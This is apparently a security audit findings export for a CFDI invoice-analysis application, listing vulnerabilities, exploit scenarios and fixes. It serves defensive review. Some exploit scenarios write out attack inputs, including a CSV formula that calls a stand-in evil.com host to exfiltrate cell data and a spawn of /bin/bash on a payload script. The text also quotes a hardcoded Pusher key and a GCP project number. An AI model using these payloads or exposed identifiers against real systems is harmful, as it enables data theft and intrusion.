candidates.title: XXE / Billion Laughs entity expansion via ET.fromstring in Python subprocess wrapper fallback
candidates.description: When python-satcfdi is not installed, the wrapper falls back to xml.etree.ElementTree.fromstring() without defusedxml, making it vulnerable to billion laughs entity expansion DoS.
candidates.exploit_scenario: Attacker uploads CFDI XML with nested entity declarations. Fallback path at line 406 calls ET.fromstring(xml) which expands internal entities exponentially, exhausting server memory/CPU.
candidates.recommendation: Replace ET.fromstring(xml) with defusedxml.ElementTree.fromstring(xml). Add defusedxml as dependency.

candidates.title: NaN/Infinity propagation from attacker-crafted numeric XML attributes into math diagnosis engine
candidates.description: getNum() calls Number() on attacker-controlled XML attribute strings without checking for NaN or Infinity. SubTotal='NaN' produces NaN that cascades through math engine triggering spurious findings.
candidates.exploit_scenario: Attacker crafts CFDI with SubTotal='NaN'. NaN propagates through roundCurrency, sumSafe, diffCurrency, and NaN !== 0 triggers false discrepancy findings displayed in UI.
candidates.recommendation: Add isNaN check: const n = Number(value); return Number.isFinite(n) ? n : 0;

candidates.title: Untrusted XML attribute values interpolated into diagnostic display strings without sanitization
candidates.description: XML attributes (Descripcion, Impuesto, TipoFactor) flow directly into data.findings[].summary and data.supportText via string interpolation. React JSX escapes today, but non-React consumers (PDF, CSV, clipboard, email) could be vulnerable.
candidates.exploit_scenario: Attacker sets Descripcion='' in CFDI concept. If future feature exports findings to HTML email or renders in non-React context, payload executes.
candidates.recommendation: Strip HTML/control characters from user-supplied XML text fields before they enter the findings pipeline.

candidates.title: Subprocess binary path injection via unvalidated pythonBinary engine option
candidates.description: pythonBinary option passed directly to spawn() without validation, allowlisting, or path sanitization. Any caller-supplied binary path is executed.
candidates.exploit_scenario: Caller passes { pythonBinary: '/bin/bash', wrapperPath: '/tmp/payload.sh' } causing spawn('/bin/bash', ['/tmp/payload.sh']).
candidates.recommendation: Validate pythonBinary against allowlist or derive from trusted base path only. Never accept arbitrary binary paths.

candidates.title: Arbitrary file execution via unvalidated wrapperPath engine option
candidates.description: wrapperPath option passed as script argument to spawn() with no validation. Any absolute or relative path is accepted.
candidates.exploit_scenario: Attacker sets wrapperPath to malicious script path and pythonBinary to valid Python interpreter.
candidates.recommendation: Restrict wrapperPath to a known directory, validate it resolves within expected path and has .py extension.

candidates.title: Full stderr/stdout from Python subprocess leaked in error messages
candidates.description: When Python wrapper fails, both stderr and stdout outputs are embedded verbatim in Error message, leaking internal system info, Python stack traces, file paths to the API response and UI.
candidates.exploit_scenario: Malformed CFDI triggers Python crash. stderr with file paths and library internals is returned to caller revealing recon data.
candidates.recommendation: Log stderr internally, return generic error message to caller.
candidates.snippet: reject(new Error(`El wrapper Python devolvió JSON inválido. Salida: ${stdout || stderr}`))

candidates.title: Raw error messages propagated from TypeScript engines without sanitization
candidates.description: Every caught exception has error.message directly embedded into issues array with no sanitization or truncation across 4 catch blocks.
candidates.exploit_scenario: XML parser error with internal paths passed through to user-facing response.
candidates.recommendation: Use generic user-facing messages for issues, log internal details separately.
candidates.snippet: error instanceof Error ? error.message : 'No se pudo detectar el perfil CFDI'

candidates.title: Billion Laughs / Entity Expansion DoS via stdlib ET.fromstring in batch_reports.py
candidates.description: Python's stdlib xml.etree.ElementTree.fromstring() resolves internal XML entities without expansion depth limits. Attacker uploading crafted 'billion laughs' XML causes exponential entity expansion, exhausting server memory.
candidates.exploit_scenario: Attacker uploads 1KB XML with deeply nested entity declarations to batch DIOT endpoint. Parser expands entities to GB of data, crashing the process.
candidates.recommendation: Replace ET.fromstring() with defusedxml.ElementTree.fromstring() or instantiate XMLParser with entity expansion limits.

candidates.title: Missing authentication on /api/cfdi/batch/status/{batch_id} exposes full fiscal data
candidates.description: GET /api/cfdi/batch/status/{batch_id} returns sensitive fiscal data (RFCs, invoice totals, filenames, analysis findings) with zero authentication and zero ownership verification.
candidates.exploit_scenario: Attacker with batch_id (from shared URLs, browser history, referrer headers) calls status endpoint and receives RFCs, amounts, findings for all CFDIs in the batch.
candidates.recommendation: Add authentication middleware. Implement ownership verification — check requesting identity matches batch owner.

candidates.title: Raw Python exception string leaked in DIOT generation HTTP 500 response
candidates.description: batch_diot endpoint catches all Exception types and interpolates raw Python exception string into HTTP 500 response body, exposing internal error details to unauthenticated clients.
candidates.exploit_scenario: Attacker sends crafted XML causing generate_diot() to raise exception. Response includes internal paths and library details via str(e).
candidates.recommendation: Return generic error message. Log full exception via logger.exception() or sentry_sdk.capture_exception().

candidates.title: Raw exception strings exposed to clients in batch worker analysis results
candidates.description: When run_analyze_cfdi() raises exception in batch_worker_task, raw Python exception string (str(e)) is stored in parsed_result['error'], persisted to GCS, and broadcast via Pusher to unauthenticated clients.
candidates.exploit_scenario: Attacker polls batch status or listens on Pusher and receives raw exception strings revealing internal paths and library internals.
candidates.recommendation: Replace error_msg = str(e) with generic message. Send full exception to Sentry only.

candidates.title: Subprocess error messages passed through as client-facing public_messages without sanitization
candidates.description: _map_issue function assigns subprocess wrapper's raw issue message directly as public_message without sanitization. Internal paths, stack traces, and library internals forwarded verbatim to API clients.
candidates.exploit_scenario: TypeScript wrapper error includes absolute filesystem paths. These pass through to AnalyzeCfdiResponse.issues[].message in API response.
candidates.recommendation: Map subprocess error messages to safe user-facing messages via translation table. Never assign raw subprocess output to public_message.

candidates.title: CFDI digital signature verification error exposed in analysis findings without sanitization
candidates.description: _collect_sello_findings embeds raw error message from signature verification (sv.get('error')) into finding summary returned to client. May contain crypto library error details or internal paths.
candidates.exploit_scenario: Attacker submits CFDI with deliberately corrupted signature. Cryptographic verification error embedded in finding summary and returned via API.
candidates.recommendation: Use generic message for client-facing signature errors. Log raw error via observability layer.

candidates.title: CFDI UUID and tax correction values persist on system clipboard without clearing
candidates.description: CopyButton writes CFDI UUIDs and financial correction values to system clipboard via navigator.clipboard.writeText() with no clearing mechanism. Data persists after browser/tab close.
candidates.exploit_scenario: User copies UUID, closes browser. Malicious extension with clipboardRead permission reads and exfiltrates UUID. Combined with RFC and amount, attacker queries SAT portal.
candidates.recommendation: Clear clipboard after timeout or display warning about clipboard persistence.

candidates.title: CSV formula injection via escapeCsv without formula character guard — four export paths affected
candidates.description: escapeCsv only escapes double quotes but does not guard against formula injection characters (=, +, -, @). All four export functions pass attacker-controlled CFDI XML fields through this unsanitized function into downloadable CSVs.
candidates.exploit_scenario: Attacker sets concepto.descripcion to =HYPERLINK("http://evil.com/steal") in CFDI XML. User exports CSV to Excel. Formula executes exfiltrating cell data.
candidates.recommendation: Prefix cell values starting with =, +, -, @ with single quote: /^[=+\-@]/.test(safe) ? `'"${safe}"` : `"${safe}"`

candidates.title: Raw FastAPI error detail exposed to end-user via useCfdiAnalysis error handling
candidates.description: Catch block propagates raw Error.message (containing unredacted FastAPI detail from backend) directly into React state for UI rendering without sanitization.
candidates.exploit_scenario: Malformed XML triggers backend exception. FastAPI detail field containing internal paths is assigned to React state and rendered in UI.
candidates.recommendation: Replace error.message with generic user-facing message. Log original to console/Sentry.

candidates.title: Raw backend error detail exposed to end-user via useRfcValidation error handling
candidates.description: Catch block propagates raw Error.message (from backend body.detail) directly into satError React state for UI display with no sanitization.
candidates.exploit_scenario: Malformed RFC input causes backend exception. Raw error detail rendered in validation UI.
candidates.recommendation: Replace err.message with generic error message for user display.
candidates.snippet: setSatError(err instanceof Error ? err.message : 'Error en portal SAT');

candidates.title: Raw backend error detail exposed to end-user via useSatEnquiry error handling
candidates.description: Catch block propagates raw Error.message (from backend body.detail) directly into error React state for UI rendering with no sanitization.
candidates.exploit_scenario: Invalid UUID triggers backend exception. Raw error detail renders in enquiry UI.
candidates.recommendation: Replace err.message with generic error message.
candidates.snippet: setError(err instanceof Error ? err.message : 'Error consultando SAT');

candidates.title: Sensitive CFDI financial data fully exposed in React DevTools via useState
candidates.description: Entire CFDI dataset (UUIDs, RFCs, amounts, concept details) stored unredacted in React useState across multiple hooks. React DevTools exposes all state without access control.
candidates.exploit_scenario: Passerby opens React DevTools on unattended computer and reads invoice data including client RFCs, UUIDs, amounts.
candidates.recommendation: Minimize what is stored in React state. Use closures/refs for data not needing re-renders.

candidates.title: Full error object with stack trace logged to console in useCfdiExports
candidates.description: exportPagosCsv passes raw Error object to console.error. Stack trace reveals internal file paths and sensitive context in production.
candidates.exploit_scenario: Export with malformed data logs full stack trace to browser console visible to anyone with physical access.
candidates.recommendation: Use generic message for production console output. Send full error to Sentry.

candidates.title: Four opentelemetry packages completely unpinned — dependency confusion and supply-chain compromise vector
candidates.description: opentelemetry-api, opentelemetry-sdk, opentelemetry-instrumentation-fastapi, opentelemetry-exporter-gcp-trace have zero version constraints. Any compromised version published to PyPI is auto-installed on next deploy to production.
candidates.exploit_scenario: Attacker compromises PyPI maintainer account and publishes malicious opentelemetry-api 99.0.0 with reverse shell in setup.py. Next push to main triggers deploy with compromised package executing in build container.
candidates.recommendation: Pin all four with exact versions and upper bounds. Add --require-hashes to Dockerfile pip install.

candidates.title: Unbounded upper version on google-cloud-storage allows automatic major-version upgrades
candidates.description: google-cloud-storage>=2.14.0 has no upper bound. New major versions auto-installed on next build with no human review gate.
candidates.exploit_scenario: Malicious google-cloud-storage 4.0.0 published to PyPI. Lower-bound-only constraint matches it. Installed on next deploy.
candidates.recommendation: Add upper bound: google-cloud-storage>=2.14.0,<3

candidates.title: Environment variable injection via newline in GitHub secret interpolated into YAML block scalar
candidates.description: env_vars YAML block scalar interpolates VERCEL_URL secret. Newline in secret value creates additional KEY=VALUE line, injecting arbitrary env vars into Cloud Run service.
candidates.exploit_scenario: Admin sets VERCEL_URL with embedded newline. Deploy action interprets as extra env var, potentially overwriting secrets.
candidates.recommendation: Validate secret values for newlines before reaching env_vars block. Use individual env_vars entries.

candidates.title: Third-party action millionco/react-doctor@v2 granted excessive permissions
candidates.description: react-doctor workflow grants pull-requests: write, issues: write, statuses: write to third-party action. Only pull-requests: write is needed. Extra permissions allow compromised action to modify/delete issues.
candidates.exploit_scenario: Compromised react-doctor action with issues: write creates phishing issues, modifies PR descriptions, or exfiltrates repository metadata.
candidates.recommendation: Reduce to contents: read and pull-requests: write only. Remove issues: write and statuses: write.
candidates.snippet:
permissions:
  contents: read
  pull-requests: write
  issues: write
  statuses: write

candidates.title: Production deploy workflows lack explicit permissions declaration — inherit potentially write-all GITHUB_TOKEN
candidates.description: deploy-backend.yml and deploy-frontend.yml have no top-level permissions block. Workflows inherit default GITHUB_TOKEN which may be write-all depending on org settings.
candidates.exploit_scenario: Compromised deploy step with write-all token can modify code, create releases, delete artifacts.
candidates.recommendation: Add permissions: contents: read at top level of both workflows.

candidates.title: No deployment approval gate — push to main immediately deploys to production
candidates.description: Both deploy workflows trigger on push to main with no environment protection rules, required reviewers, or manual approval gate. Any push to main deploys immediately.
candidates.exploit_scenario: Developer pushes broken change, production overwritten with no human review. Compromised account pushes malicious code to public API.
candidates.recommendation: Add environment: production with required reviewers. Restrict to protected tags or manual approval.

candidates.title: Stale detect-secrets baseline with orphaned entries for deleted files
candidates.description: .secrets.baseline contains entries for deleted files (gen_data.py, DocumentSettings.jsx). If real secret with same hash appears in new file, it would be suppressed by stale baseline.
candidates.exploit_scenario: Developer commits real private key matching old suppressed hash. Stale baseline entry masks it. Secret lands in repo undetected.
candidates.recommendation: Regenerate baseline with detect-secrets scan --update. Establish periodic baseline regeneration in CI.

candidates.title: Two divergent deploy paths for same Cloud Run service — doubled attack surface
candidates.description: Same Cloud Run service deployed from deploy-backend.yml (GitHub Actions, overwrite strategy) and cloudbuild.yaml (Cloud Build, merge strategy). Divergent env var strategies create race condition and double deploy attack surface.
candidates.exploit_scenario: Cloud Build deploys with only ALLOWED_ORIGINS. GitHub Actions deploys with full secret set. Last deploy wins, env vars wiped if wrong pipeline wins.
candidates.recommendation: Consolidate to single deploy path or add concurrency gate. Unify env var strategy across both paths.
candidates.snippet:
- name: Deploy API to Cloud Run
        uses: google-github-actions/deploy-cloudrun@v2

candidates.title: Cloud Run service deployed with --allow-unauthenticated on default compute SA with Editor role
candidates.description: Cloud Run service deployed with --allow-unauthenticated (publicly accessible) and no explicit --service-account, defaulting to compute engine default SA which may hold Editor role. Public endpoint with project-level GCP access.
candidates.exploit_scenario: Attacker exploits SSRF/RCE in public Cloud Run API. Service runs as default compute SA with Editor, allowing modification of any GCP resource.
candidates.recommendation: Create dedicated SA with minimum required permissions. Specify via service_account parameter. Consider IAP instead of allow-unauthenticated.

candidates.title: Production secrets on disk in backend/.env — PUSHER_SECRET, REDIS_PASSWORD, SENTRY_DSN unencrypted
candidates.description: File backend/.env contains live production secrets (PUSHER_SECRET, REDIS_PASSWORD, SENTRY_DSN) in plaintext on developer machine. Single accidental commit exposes full production credentials.
candidates.exploit_scenario: Developer runs git add -f backend/.env bypassing .gitignore. PUSHER_SECRET grants publishing to all clients. REDIS_PASSWORD grants full Redis access. SENTRY_DSN allows flooding or reading Sentry data.
candidates.recommendation: Remove backend/.env immediately. Use secrets manager or env var injection at runtime. Encrypt at rest with git-crypt or SOPS.

candidates.title: No cryptographic hash pinning for pip dependencies — supply chain attack vector
candidates.description: requirements.txt uses version ranges without --hash=sha256: entries. Dockerfile runs pip install without --require-hashes. Four deps completely unpinned. Compromised PyPI package results in arbitrary code execution in production build.
candidates.exploit_scenario: Attacker publishes malicious package to PyPI. pip installs during Docker build. setup.py executes in build context with GCP credential access.
candidates.recommendation: Pin all deps with exact versions and SHA256 hashes. Use pip-compile --generate-hashes. Add --require-hashes to Dockerfile.

candidates.title: Long-lived GCP Service Account Key used instead of Workload Identity Federation
candidates.description: Deploy authenticates via long-lived SA key (credentials_json: ${{ secrets.GCP_SA_KEY }}) instead of Workload Identity Federation (OIDC). Key never expires, cannot be easily rotated, if leaked grants persistent GCP access.
candidates.exploit_scenario: GCP_SA_KEY leaked via log output, compromised action, or developer env. Attacker gains persistent GCP access with no expiration. Can deploy arbitrary Cloud Run revisions, access GCS, modify IAM.
candidates.recommendation: Migrate to Workload Identity Federation using workload_identity_provider. Delete long-lived SA key after migration.

candidates.title: detect-secrets 'pragma: allowlist secret' suppresses real hardcoded Pusher key in source
candidates.description: Pusher app key 'ec582a031473e2da1654' hardcoded as fallback with // pragma: allowlist secret to suppress detect-secrets. Allowlist filter actively circumvented for a real hardcoded production credential.
candidates.exploit_scenario: Pragma mechanism intended for test fixtures now suppresses real production key. Normalizes secret suppression for future developers.
candidates.recommendation: Remove hardcoded fallback. Require VITE_PUSHER_KEY via env var, fail fast if absent. Remove pragma comment. Audit all other pragma uses.
candidates.snippet: const key = (import.meta as any).env.VITE_PUSHER_KEY || 'ec582a031473e2da1654'; // pragma: allowlist secret

candidates.title: Container image deployed with :latest tag — no digest pinning or signature verification
candidates.description: Cloud Run Job uses IMAGE='...:latest' deploying by mutable tag. Any image pushed to same tag by compromised CI or insider deploys on next execution with no cryptographic integrity check.
candidates.exploit_scenario: Attacker with push access to Artifact Registry pushes malicious :latest image. Next operator run deploys it with same GCP SA, network, and Redis access.
candidates.recommendation: Pin image by digest (sha256:...). Configure Binary Authorization. Sign images with cosign.

candidates.title: VERCEL_TOKEN passed as CLI argument — visible in process listing and shell history
candidates.description: VERCEL_TOKEN injected as --token= CLI argument instead of environment variable. Visible in /proc/<pid>/cmdline on runner. Vercel CLI supports env var which keeps token out of process args.
candidates.exploit_scenario: Compromised dependency reads /proc/*/cmdline to extract VERCEL_TOKEN. Attacker deploys malicious code to production Vercel frontend.
candidates.recommendation: Pass VERCEL_TOKEN as env var: env: VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }} instead of --token= flag.

candidates.title: Infrastructure reconnaissance data exposed in version-controlled deployment script
candidates.description: --set-env-vars hardcodes GCP project number (706861124428), Upstash Redis hostname, and Pusher cluster in git-versioned script. Infrastructure topology revealed without reconnaissance.
candidates.exploit_scenario: Attacker with repo read access learns exact GCP project, Redis hostname, Pusher cluster. Combined with other findings enables targeted attacks.
candidates.recommendation: Move infrastructure config to GitHub Variables/Secrets. Reference via env vars injected at runtime.

candidates.title: GitHub Actions use floating major-version tags without commit SHA pinning
candidates.description: actions/checkout@v4, google-github-actions/auth@v2, deploy-cloudrun@v2 use mutable major-version tags. Compromised action repo can move tag to malicious commit executing with full secret access.
candidates.exploit_scenario: Attacker compromises google-github-actions/auth and moves v2 tag to exfiltrate GCP_SA_KEY. Next deploy runs malicious action.
candidates.recommendation: Pin all actions to full commit SHA: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

candidates.title: Four opentelemetry dependencies completely unpinned — no version constraints at all
candidates.description: Same as B7-CI-INJ-01. Confirmed through crypto lens as supply-chain vulnerability enabling malicious package injection at build time.
candidates.exploit_scenario: Same as B7-CI-INJ-01.
candidates.recommendation: Pin with exact versions and upper bounds. Add --require-hashes.

candidates.title: detect-secrets baseline references deleted files — stale exclusions could mask new secrets
candidates.description: .secrets.baseline has entries for deleted gen_data.py. If new file at same path contains real secrets, stale baseline may suppress detection.
candidates.exploit_scenario: Developer creates new file at same path with real API keys. Stale baseline masks them. Secrets enter repo silently.
candidates.recommendation: Run detect-secrets scan --update to regenerate against current codebase. Add periodic CI job.

confirmed_existing.title: ET.fromstring sin defusedxml
confirmed_existing.evidence: python-satcfdi-wrapper.py:406 (fallback path), batch_reports.py:31 (_extract_iva_from_xml), and batch.py:83 — all three use stdlib ET.fromstring without defusedxml. Zero defusedxml imports or usage across entire backend.
confirmed_existing.note: batch_reports.py:31 now confirmed as vulnerable billion laughs path within the flow-backend-analysis component scope.

confirmed_existing.title: Error details leaked in HTTP responses
confirmed_existing.evidence: Multiple layers leak raw errors: pythonSatcfdiEngine.ts:249 (stderr/stdout in Error msg), currentTsEngine.ts:27,51,102,120 (raw error.message), batch.py:336 (str(e) in HTTP 500), batch.py:272 (str(e) in worker results), current_ts.py:114 (raw subprocess msg in public_message), analyze_cfdi.py:646 (crypto error in finding), InspectorHeader.tsx:209-212 (satError in DOM), RfcValidationPanel.tsx:149,155 (satResult.error in DOM), useCfdiAnalysis.ts:78 (error.message in state), useRfcValidation.ts:53 (err.message in state), useSatEnquiry.ts:30 (err.message in state).
confirmed_existing.note: End-to-end pattern confirmed: backend detail → API client throw → hook catch → useState → UI render. Zero sanitization layers.

confirmed_existing.title: Excel/CSV formula injection
confirmed_existing.evidence: useCfdiExports.ts:15-17 — escapeCsv only double-quote-escapes, no formula character prefixing. Four export paths affected: exportTaxBreakdown (line 110), exportIngresosCsv (137), exportPagosCsv (166), exportCurrentTable (195). All flow attacker-controlled XML fields into downloadable CSVs.
confirmed_existing.note: Separate implementation from BatchAnalysisPage.tsx:189. 45+ string fields from CFDIIngresoRow/CFDIPagoRow originate from CFDI XML.

confirmed_existing.title: Sin validación MIME/content-type en uploads
confirmed_existing.evidence: useCfdiAnalysis.ts:42-48 — handleFileSelect accepts any File without checking type, magic bytes, or extension. sat-enquiry-api-client.ts:53-65 — enquiryBatch appends File to FormData with no type check.

confirmed_existing.title: Pusher public channels
confirmed_existing.evidence: pdf-download.ts:412 subscribes to pdf-batch-<batchId> as public channel. BatchAnalysisPage.tsx:808 subscribes to batch_<batchId> as public channel. Batch IDs in localStorage readable by any script on origin.

confirmed_existing.title: Pusher key hardcodeada
confirmed_existing.evidence: pdf-download.ts:308 — 'ec582a031473e2da1654' as fallback with pragma: allowlist secret. Same key in backend/.env, frontend/.env.production, frontend/.env.local. Secret sprawl from single hardcoded origin.
confirmed_existing.note: pragma: allowlist secret abused to suppress real production key. Key hardcoded in 4 separate files.

confirmed_existing.title: Dependency confusion risk

confirmed_existing.title: Cloud Run usa default compute SA con Editor

confirmed_existing.title: Zero rate limiting
confirmed_existing.evidence: No SlowAPI, Flask-Limiter, or custom throttle imported/configured across backend. All CFDI endpoints accept unlimited requests from any IP without authentication.
confirmed_existing.note: Combined with no auth (B7-BE-AUTH-01), attacker can flood analysis engine with unlimited requests.
